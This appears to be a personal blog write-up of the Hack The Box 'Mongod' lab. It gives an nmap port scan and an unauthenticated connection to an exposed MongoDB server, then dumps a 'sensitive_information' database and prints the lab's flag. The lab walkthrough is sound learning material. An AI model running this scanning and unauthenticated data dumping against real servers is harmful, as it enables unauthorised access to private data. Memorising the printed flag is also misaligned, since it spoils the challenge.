---
title: "[HTB] Mongod"
author: "Wook Lee"
date: "2024-07-10"
tags: ["Hack The Box"]
---

it's been quite a while since I tackled any challenges on Hack The Box. My original plan was to strengthen my fundamentals on TryHackMe and then come back to Hack The Box. But now I'm thinking, why not do both at the same time? I can learn by diving in and trying things out as I go.

<div style="text-align: center"><img src="./just_do_it.gif"></div>

---

#### How many TCP ports are open on the machine?

```
2
```

```shell
┌─[us-starting-point-vip-1-dhcp]─[10.10.14.28]─[leewookb@htb-l3lgefdeyz]─[~]
└──╼ [★]$ sudo nmap -sC -sV 10.129.228.30 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-10 23:00 CDT
Nmap scan report for 10.129.228.30
Host is up (0.0087s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
27017/tcp open  mongodb MongoDB 3.6.8 3.6.8
```

<br>

#### Which service is running on port 27017 of the remote host?

```
MongoDB 3.6.8
```

`27017/tcp open  mongodb MongoDB 3.6.8 3.6.8`

<br>

#### What type of database is MongoDB? (Choose: SQL or NoSQL)

```
NoSQL
```

MongoDB is a NoSQL database designed for scalability, flexibility, and ease of development. MongoDB stores data in flexible, JSON-like documents, meaning fields can vary from document to document and data structure can be changed over time. This differs from traditional relational databases that use tables and rows to store data.

<br>

#### What is the command name for the Mongo shell that is installed with the mongodb-clients package?

```
mongo
```

<br>

#### What is the command used for listing all the databases present on the MongoDB server? (No need to include a trailing ;)

```
show dbs
```

In order to connect to the remote MongoDB server we need to install the `mongodb` utility by running the following command:
`curl -O https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.4.7.tgz`

then extract the contents of the tar archive file using the `tar` utility
`tar xvf mongodb-linux-x86_64-3.4.7.tgz`

Then navigate to the `bin` folder to execute the mongo binary and connect to the MongoDB server
`./mongo mongodb://10.129.228.30:27017`

We are connected to the mongoDB server.

```shell
┌─[us-starting-point-vip-1-dhcp]─[10.10.14.28]─[leewookb@htb-l3lgefdeyz]─[~/Downloads/mongodb-linux-x86_64-3.4.7/bin]
└──╼ [★]$ ./mongo mongodb://10.129.228.30:27017
MongoDB shell version v3.4.7
connecting to: mongodb://10.129.228.30:27017
MongoDB server version: 3.6.8
WARNING: shell and server versions do not match
Welcome to the MongoDB shell.
For interactive help, type "help".
For more comprehensive documentation, see
	http://docs.mongodb.org/
Questions? Try the support group
	http://groups.google.com/group/mongodb-user
Server has startup warnings:
2024-07-11T03:57:47.294+0000 I STORAGE  [initandlisten]
2024-07-11T03:57:47.294+0000 I STORAGE  [initandlisten] ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
2024-07-11T03:57:47.294+0000 I STORAGE  [initandlisten] **          See http://dochub.mongodb.org/core/prodnotes-filesystem
2024-07-11T03:57:49.369+0000 I CONTROL  [initandlisten]
2024-07-11T03:57:49.369+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.
2024-07-11T03:57:49.369+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.
2024-07-11T03:57:49.369+0000 I CONTROL  [initandlisten]
>
```

<br>

the `help` command shows `show dbs` command lists all the databases present on the server.

```shell
> help
	db.help()                    help on db methods
	db.mycoll.help()             help on collection methods
	sh.help()                    sharding helpers
	rs.help()                    replica set helpers
	help admin                   administrative help
	help connect                 connecting to a db help
	help keys                    key shortcuts
	help misc                    misc things to know
	help mr                      mapreduce

	show dbs                     show database names
```

<br>

#### What is the command used for listing out the collections in a database? (No need to include a trailing ;)

```
show collections
```

<br>

#### What is the command used for dumping the content of all the documents within the collection named flag in a format that is easy to read?

```
db.flag.find().pretty()
```

<br>

`help` command
![alt text](image-1.png#center)

<br>

`db.mycoll.help()` command
![alt text](image-2.png#center)

<br>

`db.mycoll.find().help()` command
![alt text](image-3.png#center)

<br>

#### submit root flag

```
1b6e6fb359e7c40241b6d431427ba6ea
```

<br>

`show dbs` -> `use sensitive_information` -> `show collections` -> `db.flag.find()`

```shell
> show dbs
admin                  0.000GB
config                 0.000GB
local                  0.000GB
sensitive_information  0.000GB
users                  0.000GB
> use sensitive_information
switched to db sensitive_information
> show collections
flag
> db.flag.find()
{ "_id" : ObjectId("630e3dbcb82540ebbd1748c5"), "flag" : "1b6e6fb359e7c40241b6d431427ba6ea" }
>
```

<br>

![alt text](image-4.png#center)
